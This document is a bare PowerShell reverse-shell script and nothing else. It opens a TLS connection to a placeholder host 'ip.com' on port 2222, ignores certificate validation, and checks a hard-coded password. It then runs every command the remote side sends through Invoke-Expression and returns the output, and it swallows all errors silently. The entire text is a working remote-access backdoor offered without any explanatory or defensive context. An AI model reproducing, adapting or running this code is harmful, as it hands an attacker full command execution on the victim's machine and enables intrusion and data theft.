$IP="ip.com"; $P=2222; $pw="password"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("CLIENT_READY"); if($r.ReadLine() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
